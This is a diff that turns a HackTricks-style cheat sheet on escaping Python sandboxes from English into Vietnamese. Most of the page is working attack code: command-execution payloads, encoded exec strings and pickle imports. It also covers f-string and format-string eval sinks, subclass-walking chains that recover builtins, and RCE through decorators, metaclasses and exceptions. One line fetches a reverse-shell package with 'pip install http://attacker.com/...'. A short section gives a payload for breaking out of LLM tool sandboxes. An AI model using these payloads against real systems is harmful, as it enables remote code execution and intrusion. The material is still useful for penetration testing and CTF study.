@@ -1,17 +1,17 @@
-# Bypass Python sandboxes
+# Bypass Python sandbox
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-These are some tricks to bypass python sandbox protections and execute arbitrary commands.<sup>[[1]](#references)[[2]](#references)</sup>
+Dưới đây là một số thủ thuật để vượt qua các cơ chế bảo vệ sandbox Python và thực thi lệnh tùy ý.<sup>[[1]](#references)[[2]](#references)</sup>
 
 {{#ref}}
 js2py-sandbox-escape-cve-2024-28397.md
 {{#endref}}
 
 
-## Command Execution Libraries
+## Thư viện thực thi lệnh
 
-The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:
+Điều đầu tiên bạn cần biết là liệu có thể thực thi mã trực tiếp bằng một thư viện đã được import sẵn hay không, hoặc liệu bạn có thể import bất kỳ thư viện nào trong số này hay không:
 
 ```python
 os.system("ls")
@@ -46,21 +46,21 @@ execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
 
-Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.
+Remember rằng các hàm _**open**_ và _**read**_ có thể hữu ích để **đọc file** bên trong Python sandbox và **viết một đoạn code** mà bạn có thể **thực thi** để **bypass** sandbox.
 
-> [!CAUTION] > **Python2 input()** function allows executing python code before the program crashes.
+> [!CAUTION] > Hàm **Python2 input()** cho phép thực thi code Python trước khi chương trình gặp lỗi và crash.
 
-Python try to **load libraries from the current directory first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`
+Python cố gắng **load thư viện từ thư mục hiện tại trước** (lệnh sau sẽ in ra nơi Python load các module): `python3 -c 'import sys; print(sys.path)'`
 
-![Bypass Python sandboxes - Command Execution Libraries: Python try to load libraries from the current directory first (the following command will print where is python loading modules...](<../../../images/image (559).png>)
+![Bypass Python sandboxes - Command Execution Libraries: Python cố gắng load thư viện từ thư mục hiện tại trước (lệnh sau sẽ in ra nơi Python load các module...](<../../../images/image (559).png>)
 
-## Bypass pickle sandbox with the default installed python packages
+## Bypass pickle sandbox bằng các package Python được cài đặt mặc định
 
-### Default packages
+### Các package mặc định
 
-You can find a **list of pre-installed** packages here: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Note that from a pickle you can make the python env **import arbitrary libraries** installed in the system.\
-For example, the following pickle, when loaded, is going to import the pip library to use it:
+Bạn có thể tìm **danh sách** các package **được cài đặt sẵn** tại đây: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Lưu ý rằng từ một pickle, bạn có thể khiến môi trường Python **import các thư viện bất kỳ** được cài đặt trên hệ thống.\
+Ví dụ, pickle sau đây sẽ import thư viện pip khi được load để sử dụng thư viện này:
 
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -75,34 +75,34 @@ class P(object):
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
 
-For more information about how pickle works check this: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/).<sup>[[16]](#references)</sup>
+Để biết thêm thông tin về cách pickle hoạt động, hãy xem: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/).<sup>[[16]](#references)</sup>
 
 ### Pip package
 
-Trick shared by **@isHaacK**
+Thủ thuật được chia sẻ bởi **@isHaacK**
 
-If you have access to `pip` or `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
+Nếu bạn có quyền truy cập vào `pip` hoặc `pip.main()`, bạn có thể cài đặt một package bất kỳ và tạo reverse shell bằng cách gọi:
 
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
 
-You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
+Bạn có thể tải package để tạo reverse shell tại đây. Lưu ý rằng trước khi sử dụng, bạn nên **giải nén package, chỉnh sửa `setup.py` và điền IP của bạn để dùng cho reverse shell**:
 
 {{#file}}
 Reverse.tar (1).gz
 {{#endfile}}
 
 > [!TIP]
-> This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
+> Package này có tên là `Reverse`. Tuy nhiên, nó được tạo đặc biệt để khi bạn thoát khỏi reverse shell, phần còn lại của quá trình cài đặt sẽ thất bại, nhờ đó bạn **sẽ không để lại package Python nào được cài thêm trên server** sau khi rời đi.
 
-## Eval-ing python code
+## Đánh giá mã Python
 
 > [!WARNING]
-> Note that exec allows multiline strings and ";", but eval doesn't (check walrus operator)
+> Lưu ý rằng `exec` cho phép dùng chuỗi nhiều dòng và `;`, nhưng `eval` thì không (hãy kiểm tra toán tử walrus)
 
-If certain characters are forbidden you can use the **hex/octal/B64** representation to **bypass** the restriction:
+Nếu một số ký tự bị cấm, bạn có thể dùng biểu diễn **hex/octal/B64** để **bypass** hạn chế đó:
 
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
@@ -125,9 +125,9 @@ exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
 
-### F-string re-evaluation sinks
+### Các sink đánh giá lại f-string
 
-A different but very common bug is to **insert attacker-controlled data into a string and then evaluate that string as an f-string**. This is **not** Jinja/SSTI; the Python interpreter itself executes anything placed inside `{...}` during the second evaluation step:<sup>[[10]](#references)</sup>
+Một lỗi khác nhưng rất phổ biến là **chèn dữ liệu do kẻ tấn công kiểm soát vào một chuỗi, rồi đánh giá chuỗi đó dưới dạng f-string**. Đây **không phải** Jinja/SSTI; chính trình thông dịch Python sẽ thực thi mọi thứ nằm bên trong `{...}` trong bước đánh giá thứ hai:<sup>[[10]](#references)</sup>
 
 ```python
 def template(first, last, gender):
@@ -145,26 +145,26 @@ eval(f"f'''{s}'''")
 # '5'
 ```
 
-So, if braces, quotes, dots, underscores and parentheses are allowed, a payload such as the following usually gives command execution:
+Vì vậy, nếu dấu ngoặc nhọn, dấu nháy, dấu chấm, dấu gạch dưới và dấu ngoặc đơn được cho phép, một payload như sau thường có thể thực thi lệnh:
 
 ```python
 {__import__("os").popen("id").read()}
 ```
 
-If spaces or shell metacharacters are filtered, wrap the command in Base64 and decode it inside the expression:
+Nếu dấu cách hoặc các ký tự đặc biệt của shell bị lọc, hãy mã hóa lệnh bằng Base64 rồi giải mã bên trong biểu thức:
 
 ```python
 {__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
 ```
 
-Useful hunting patterns:
+Các mẫu hữu ích để tìm kiếm:
 
 - `eval(f"f'''{user_input}'''")`
 - `eval(f'f"{user_input}"')`
-- Code that builds a template with user data and then calls `eval`, `exec`, or `compile` on the rebuilt string
-- XML/JSON handlers that validate characters with regexes but still allow `{}` and quotes
+- Code tạo template bằng dữ liệu người dùng rồi gọi `eval`, `exec` hoặc `compile` trên chuỗi đã tạo lại
+- Trình xử lý XML/JSON xác thực ký tự bằng regex nhưng vẫn cho phép `{}` và dấu ngoặc kép
 
-If the sink is behind a Flask endpoint that parses raw XML/bytes from `request.data`, remember that `curl -d` defaults to `application/x-www-form-urlencoded`, which can leave `request.data` empty. Use a **non-form** content type instead:
+Nếu sink nằm sau một endpoint Flask phân tích XML/byte thô từ `request.data`, hãy nhớ rằng `curl -d` mặc định dùng `application/x-www-form-urlencoded`, điều này có thể khiến `request.data` trống. Thay vào đó, hãy dùng content type **không phải form**:
 
 ```bash
 curl http://127.0.0.1:54321/addPatient \
@@ -173,7 +173,7 @@ curl http://127.0.0.1:54321/addPatient \
   -d '<patient><firstname>a</firstname><lastname>b</lastname><sender_app>app</sender_app><timestamp>1</timestamp><birth_date>01/01/2000</birth_date><gender>{2+3}</gender></patient>'
 ```
 
-### Other libraries that allow to eval python code
+### Các thư viện khác cho phép eval mã Python
 
 ```python
 #Pandas
@@ -189,15 +189,15 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
 
-Also see a real-world sandboxed evaluator escape in PDF generators:
+Xem thêm một trường hợp escape evaluator bị sandbox trong thực tế ở trình tạo PDF:
 
-- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). It abuses rl_safe_eval to reach function.__globals__ and os.system from evaluated attributes (for example, font color) and returns a valid value to keep rendering stable.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+- Đánh giá biểu thức ba dấu ngoặc vuông [[[...]]] của ReportLab/xhtml2pdf → RCE (CVE-2023-33733). Lỗ hổng này lợi dụng rl_safe_eval để truy cập function.__globals__ và os.system từ các thuộc tính được đánh giá (ví dụ: màu phông chữ), đồng thời trả về giá trị hợp lệ để quá trình render tiếp tục ổn định.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
 
 {{#ref}}
 reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
 {{#endref}}
 
-## Operators and short tricks
+## Toán tử và thủ thuật ngắn
 
 ```python
 # walrus operator allows generating variable inside a list
@@ -208,9 +208,9 @@ reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
 
-## Bypassing protections through encodings (UTF-7)
+## Bỏ qua các cơ chế bảo vệ thông qua mã hóa (UTF-7)
 
-In [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 is used to load and execute arbitrary python code inside an apparent sandbox:<sup>[[11]](#references)</sup>
+Trong [**bài viết này**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), UFT-7 được dùng để tải và thực thi mã Python tùy ý bên trong một sandbox có vẻ như an toàn:<sup>[[11]](#references)</sup>
 
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
@@ -223,13 +223,13 @@ def f(x):
 """.lstrip()
 ```
 
-It is also possible to bypass it using other encodings, e.g. `raw_unicode_escape` and `unicode_escape`.
+Cũng có thể bypass nó bằng các encoding khác, ví dụ như `raw_unicode_escape` và `unicode_escape`.
 
-## Python execution without calls
+## Thực thi Python không cần gọi hàm
 
-If you are inside a python jail that **doesn't allow you to make calls**, there are still some ways to **execute arbitrary functions, code** and **commands**.
+Nếu bạn đang ở trong một python jail **không cho phép gọi hàm**, vẫn có một số cách để **thực thi các hàm, code** và **lệnh** tùy ý.
 
-### RCE with [decorators](https://docs.python.org/3/glossary.html#term-decorator)
+### RCE bằng [decorators](https://docs.python.org/3/glossary.html#term-decorator)
 
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@@ -253,13 +253,13 @@ X = exec(X)
 class _:pass
 ```
 
-### RCE creating objects and overloading
+### RCE bằng cách tạo object và overload
 
-If you can **declare a class** and **create an object** of that class you could **write/overwrite different methods** that can be **triggered** **without** **needing to call them directly**.
+Nếu bạn có thể **khai báo một class** và **tạo một object** thuộc class đó, bạn có thể **ghi đè/ghi lại các method khác nhau** để chúng có thể được **kích hoạt** mà **không cần gọi trực tiếp**.
 
-#### RCE with custom classes
+#### RCE với custom class
 
-You can modify some **class methods** (_by overwriting existing class methods or creating a new class_) to make them **execute arbitrary code** when **triggered** without calling them directly.
+Bạn có thể sửa đổi một số **method của class** (_bằng cách ghi đè các method hiện có của class hoặc tạo một class mới_) để chúng **thực thi code tùy ý** khi được **kích hoạt**, mà không cần gọi trực tiếp.
 
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
@@ -311,9 +311,9 @@ __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 
-#### Crating objects with [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
+#### Tạo đối tượng bằng [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-The key thing that metaclasses allow us to do is **make an instance of a class, without calling the constructor** directly, by creating a new class with the target class as a metaclass.<sup>[[15]](#references)</sup>
+Điều quan trọng mà metaclasses cho phép chúng ta làm là **tạo một instance của class mà không gọi trực tiếp constructor**, bằng cách tạo một class mới với class mục tiêu làm metaclass.<sup>[[15]](#references)</sup>
 
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
@@ -330,9 +330,9 @@ Sub['import os; os.system("sh")']
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
 
-#### Creating objects with exceptions
+#### Tạo object bằng exception
 
-When an **exception is triggered** an object of the **Exception** is **created** without you needing to call the constructor directly (a trick from [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
+Khi một **exception được kích hoạt**, một object thuộc **Exception** sẽ được **tạo** mà bạn không cần gọi trực tiếp constructor (một thủ thuật của [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
 
 ```python
 class RCE(Exception):
@@ -354,7 +354,7 @@ except Klecko as k:
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
 
-### More RCE
+### Thêm RCE
 
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@@ -378,7 +378,7 @@ __builtins__.__import__ = X
 {}[1337]
 ```
 
-### Read file with builtins help & license
+### Đọc tệp bằng builtins help & license
 
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
@@ -391,22 +391,22 @@ with (a as b):
 
 ## Builtins
 
-- [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
-- [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
+- [**Các hàm builtins của python2**](https://docs.python.org/2/library/functions.html)
+- [**Các hàm builtins của python3**](https://docs.python.org/3/library/functions.html)
 
-If you can access the **`__builtins__`** object you can import libraries (notice that you could also use here other string representation shown in the last section):
+Nếu có thể truy cập đối tượng **`__builtins__`**, bạn có thể import các thư viện (lưu ý rằng bạn cũng có thể dùng các cách biểu diễn chuỗi khác được đề cập trong phần cuối):
 
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
 
-### No Builtins
+### Không có Builtins
 
-When you don't have `__builtins__` you are not going to be able to import anything nor even read or write files as **all the global functions** (like `open`, `import`, `print`...) **aren't loaded**.\
-However, **by default python imports a lot of modules in memory**. These modules may seem benign, but some of them are **also importing dangerous** functionalities inside of them that can be accessed to gain even **arbitrary code execution**.<sup>[[4]](#references)[[5]](#references)</sup>
+Khi không có `__builtins__`, bạn sẽ không thể import bất cứ thứ gì, thậm chí không thể đọc hay ghi tệp vì **tất cả các hàm toàn cục** (như `open`, `import`, `print`...) **đều chưa được tải**.\
+Tuy nhiên, **theo mặc định, Python import rất nhiều module vào bộ nhớ**. Những module này có vẻ vô hại, nhưng một số module **cũng import các chức năng nguy hiểm** bên trong mà bạn có thể truy cập để thậm chí đạt được **thực thi mã tùy ý**.<sup>[[4]](#references)[[5]](#references)</sup>
 
-In the following examples you can observe how to **abuse** some of this "**benign**" modules loaded to **access** **dangerous** **functionalities** inside of them.
+Trong các ví dụ sau, bạn có thể thấy cách **lạm dụng** một số module "**vô hại**" đã được tải để **truy cập** các **chức năng nguy hiểm** bên trong chúng.
 
 **Python2**
 
@@ -452,9 +452,9 @@ get_flag.__globals__['__builtins__']
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
 
-[**Below there is a bigger function**](#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **builtins**.
+[**Bên dưới là một hàm lớn hơn**](#recursive-search-of-builtins-globals) để tìm hàng chục/**hàng trăm** **vị trí** có thể tìm thấy **builtins**.
 
-#### Python2 and Python3
+#### Python2 và Python3
 
 ```python
 # Recover __builtins__ and make everything easier
@@ -472,9 +472,9 @@ __builtins__["__import__"]("os").system("ls")
 # See them below
 ```
 
-## Globals and locals
+## Biến toàn cục và biến cục bộ
 
-Checking the **`globals`** and **`locals`** is a good way to know what you can access.
+Kiểm tra **`globals`** và **`locals`** là cách tốt để biết bạn có thể truy cập những gì.
 
 ```python
 >>> globals()
@@ -500,15 +500,15 @@ class_obj.__init__.__globals__
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
 
-[**Below there is a bigger function**](#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
+[**Bên dưới là một hàm lớn hơn**](#recursive-search-of-builtins-globals) để tìm hàng chục/**hàng trăm** **vị trí** có thể tìm thấy **globals**.
 
-## Discover Arbitrary Execution
+## Khám phá khả năng thực thi tùy ý
 
-Here I want to explain how to easily discover **more dangerous functionalities loaded** and propose more reliable exploits.
+Ở đây, tôi muốn giải thích cách dễ dàng khám phá **các chức năng nguy hiểm hơn đã được tải** và đề xuất các exploit đáng tin cậy hơn.
 
-#### Accessing subclasses with bypasses
+#### Truy cập subclasses bằng các cách bypass
 
-One of the most sensitive parts of this technique is being able to **access the base subclasses**. In the previous examples this was done using `''.__class__.__base__.__subclasses__()` but there are **other possible ways**:
+Một trong những phần nhạy cảm nhất của kỹ thuật này là có thể **truy cập các subclasses của lớp cơ sở**. Trong các ví dụ trước, việc này được thực hiện bằng `''.__class__.__base__.__subclasses__()` nhưng vẫn còn **những cách khả thi khác**:
 
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
@@ -538,22 +538,22 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
 
-### Finding dangerous libraries loaded
+### Tìm các thư viện nguy hiểm đã được nạp
 
-For example, knowing that with the library **`sys`** it's possible to **import arbitrary libraries**, you can search for all the **modules loaded that have imported sys inside of them**:
+Ví dụ, khi biết rằng với thư viện **`sys`** có thể **import các thư viện tùy ý**, bạn có thể tìm tất cả **các module đã được nạp có import sys bên trong**:
 
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
 
-There are a lot, and **we just need one** to execute commands:
+Có rất nhiều, và **chúng ta chỉ cần một** để thực thi lệnh:
 
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
 
-We can do the same thing with **other libraries** that we know can be used to **execute commands**:
+Chúng ta cũng có thể làm điều tương tự với **các thư viện khác** mà chúng ta biết có thể được dùng để **thực thi lệnh**:
 
 ```python
 #os
@@ -589,7 +589,7 @@ We can do the same thing with **other libraries** that we know can be used to **
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
 
-Moreover, we could even search which modules are loading malicious libraries:
+Ngoài ra, chúng ta thậm chí có thể tìm kiếm những module nào đang tải các thư viện độc hại:
 
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
@@ -610,7 +610,7 @@ pdb:
 """
 ```
 
-Moreover, if you think **other libraries** may be able to **invoke functions to execute commands**, we can also **filter by functions names** inside the possible libraries:
+Ngoài ra, nếu bạn cho rằng **các thư viện khác** có thể **gọi hàm để thực thi lệnh**, chúng ta cũng có thể **lọc theo tên hàm** trong các thư viện có thể có:
 
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
@@ -645,10 +645,10 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 """
 ```
 
-## Recursive Search of Builtins, Globals...
+## Tìm kiếm đệ quy trong Builtins, Globals...
 
 > [!WARNING]
-> This is just **awesome**. If you are **looking for an object like globals, builtins, open or anything** just use this script to **recursively find places where you can find that object.**
+> Cách này thật **tuyệt vời**. Nếu bạn **đang tìm một đối tượng như globals, builtins, open hoặc bất kỳ thứ gì khác**, hãy dùng script này để **tìm đệ quy những nơi có thể tìm thấy đối tượng đó.**
 
 ```python
 import os, sys # Import these to find more gadgets
@@ -766,7 +766,7 @@ if __name__ == "__main__":
     main()
 ```
 
-You can check the output of this script on this page:
+Bạn có thể xem kết quả của script này trên trang sau:
 
 
 {{#ref}}
@@ -775,7 +775,7 @@ https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-
 
 ## Python Format String
 
-If you **send** a **string** to python that is going to be **formatted**, you can use `{}` to access **python internal information.** You can use the previous examples to access globals or builtins for example.<sup>[[14]](#references)</sup>
+Nếu bạn **gửi** một **chuỗi** cho Python và chuỗi đó sẽ được **định dạng**, bạn có thể dùng `{}` để truy cập **thông tin nội bộ của Python**. Ví dụ, bạn có thể dùng các ví dụ trước đó để truy cập globals hoặc builtins.<sup>[[14]](#references)</sup>
 
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
@@ -797,18 +797,18 @@ st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
 
-Note how you can **access attributes** in a normal way with a **dot** like `people_obj.__init__` and **dict element** with **parenthesis** without quotes `__globals__[CONFIG]`
+Lưu ý rằng bạn có thể **truy cập thuộc tính** theo cách thông thường bằng **dấu chấm**, như `people_obj.__init__`, và truy cập **phần tử dict** bằng **ngoặc vuông** không có dấu ngoặc kép: `__globals__[CONFIG]`
 
-Also note that you can use `.__dict__` to enumerate elements of an object `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+Cũng lưu ý rằng bạn có thể dùng `.__dict__` để liệt kê các phần tử của một đối tượng: `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Some other interesting characteristics from format strings is the possibility of **executing** the **functions** **`str`**, **`repr`** and **`ascii`** in the indicated object by adding **`!s`**, **`!r`**, **`!a`** respectively:
+Một số đặc điểm thú vị khác của chuỗi định dạng là khả năng **thực thi** các **hàm** **`str`**, **`repr`** và **`ascii`** trên đối tượng được chỉ định bằng cách lần lượt thêm **`!s`**, **`!r`**, **`!a`**:
 
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
 
-Moreover, it's possible to **code new formatters** in classes:
+Ngoài ra, có thể **viết các formatter mới** trong các lớp:
 
 ```python
 class HAL9000(object):
@@ -821,17 +821,17 @@ class HAL9000(object):
 #I'm afraid I can't do that.
 ```
 
-**More examples** about **format** **string** examples can be found in [**https://pyformat.info/**](https://pyformat.info)
+**Có thể tìm thêm ví dụ** về **format** **string** tại [**https://pyformat.info/**](https://pyformat.info)
 
 > [!CAUTION]
-> Check also the following page for gadgets that will r**ead sensitive information from Python internal objects**:
+> Hãy xem thêm trang sau để tìm các gadget có thể đọ**c thông tin nhạy cảm từ các đối tượng nội bộ của Python**:
 
 
 {{#ref}}
 ../python-internal-read-gadgets.md
 {{#endref}}
 
-### Sensitive Information Disclosure Payloads
+### Payload tiết lộ thông tin nhạy cảm
 
 ```python
 {whoami.__class__.__dict__}
@@ -849,22 +849,22 @@ x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main
 str(x) # Out: clueless
 ```
 
-### LLM Jails bypass
+### Bypass LLM Jails
 
-From [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`.<sup>[[12]](#references)</sup>
+Từ [đây](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`.<sup>[[12]](#references)</sup>
 
-### From format to RCE loading libraries
+### Từ format đến RCE bằng cách tải thư viện
 
-According to the [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) it's possible to load arbitrary libraries from disk abusing the format string vulnerability in python.<sup>[[13]](#references)</sup>
+Theo [**chall TypeMonkey trong writeup này**](https://corgi.rip/posts/buckeye-writeups/), có thể tải các thư viện tùy ý từ đĩa bằng cách khai thác lỗ hổng format string trong Python.<sup>[[13]](#references)</sup>
 
-As reminder, every time an action is performed in python some function is executed. For example `2*3` will execute **`(2).mul(3)`** or **`{'a':'b'}['a']`** will be **`{'a':'b'}.__getitem__('a')`**.
+Xin nhắc lại, mỗi khi một thao tác được thực hiện trong Python, một hàm nào đó sẽ được gọi. Ví dụ, `2*3` sẽ gọi **`(2).mul(3)`**, còn **`{'a':'b'}['a']`** sẽ tương đương với **`{'a':'b'}.__getitem__('a')`**.
 
-You have more like this in the section [**Python execution without calls**](#python-execution-without-calls).
+Bạn có thể xem thêm các ví dụ tương tự trong mục [**Thực thi Python không cần lời gọi**](#python-execution-without-calls).
 
-A python format string vuln doesn't allow to execute function (it's doesn't allow to use parenthesis), so it's not possible to get RCE like `'{0.system("/bin/sh")}'.format(os)`.\
-However, it's possible to use `[]`. Therefore, if a common python library has a **`__getitem__`** or **`__getattr__`** method that executes arbitrary code, it's possible to abuse them to get RCE.
+Lỗ hổng format string trong Python không cho phép thực thi hàm (không thể dùng dấu ngoặc đơn), vì vậy không thể RCE theo cách như `'{0.system("/bin/sh")}'.format(os)`.\
+Tuy nhiên, có thể dùng `[]`. Do đó, nếu một thư viện Python phổ biến có phương thức **`__getitem__`** hoặc **`__getattr__`** thực thi mã tùy ý, ta có thể khai thác chúng để đạt được RCE.
